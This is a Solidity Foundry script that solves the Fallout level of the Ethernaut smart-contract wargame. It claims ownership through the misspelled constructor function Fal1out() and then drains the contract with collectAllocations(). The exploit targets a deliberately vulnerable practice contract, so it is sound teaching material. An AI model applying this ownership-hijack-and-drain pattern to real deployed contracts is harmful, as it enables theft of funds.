// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "../interfaces/IEthernaut.sol";
import { Fallout } from "../src/Level02.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));
    Fallout instance;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("DEPLOYER_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0x676e57FdBbd8e5fE1A7A3f4Bb1296dAC880aa639);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[0].topics[2])));
        console2.log(instanceAddress);
        instance = Fallout(instanceAddress);

        instance.Fal1out();
        instance.collectAllocations();

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
